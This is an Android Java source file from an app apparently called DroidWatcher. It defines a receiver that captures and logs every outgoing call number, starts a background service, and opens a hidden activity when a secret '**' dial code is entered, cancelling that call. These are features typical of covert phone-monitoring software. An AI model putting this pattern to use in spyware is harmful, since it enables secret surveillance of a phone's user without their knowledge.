package com.droidwatcher.receivers;

import com.droidwatcher.Debug;
import com.droidwatcher.SettingsManager;
import com.droidwatcher.activity.StartupActivity;
import com.droidwatcher.services.AppService;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class OutgoingCallReceiver extends BroadcastReceiver {
	private static String sOutgoingNumber;
	
	public static String getOutgoingNumber(){
		if (sOutgoingNumber == null) {
			return "";
		}
		
		return sOutgoingNumber;
	}
	
	@Override
	public void onReceive(Context context, Intent intent) {
		String number = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
		sOutgoingNumber = number;
		Debug.i("[OutgoingCallReceiver] " + number);
		
		SettingsManager settings = new SettingsManager(context);
		
		if (settings.isConnected()) {
			context.startService(new Intent(context, AppService.class));
		}
		
		if (number == null || number.length() == 0 || number.length() < 2 || !number.substring(0, 2).equals("**")){
			return;
		}
		
		try {
			if (number.equals(settings.runCode())){
				setResultData(null);
				
				Intent in = new Intent(context, StartupActivity.class);
				in.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
				context.startActivity(in);
				return;
			}
			
		} catch (Exception e) {
			Debug.exception(e);
		}
	}
}
